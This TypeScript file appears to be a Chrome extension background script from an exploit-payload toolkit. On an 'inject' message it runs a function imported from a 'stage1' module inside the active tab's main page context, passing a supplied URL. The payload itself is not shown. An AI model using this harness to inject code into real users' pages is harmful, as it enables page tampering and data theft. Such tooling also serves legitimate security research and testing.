import type { IExploitPayload } from '~lib/exploits/interfaces';

import { f } from './stage1';

async function getCurrentTab() {
	const queryOptions = { active: true, lastFocusedWindow: true };
	const [tab] = await chrome.tabs.query(queryOptions);
	return tab;
}

const inject = async (url: string) => {
	const tabId = (await getCurrentTab()).id;
	if (!tabId) return;
	return new Promise((resolve) => {
		chrome.scripting.executeScript(
			{
				target: {
					tabId
				},
				world: 'MAIN', // MAIN in order to access the window object
				func: f,
				args: [url]
			},
			resolve
		);
	});
};

chrome.runtime.onMessage.addListener(async (data) => {
	if (data.cmd === 'inject' && data.location) {
		console.log(await inject(data.location));
	}
});
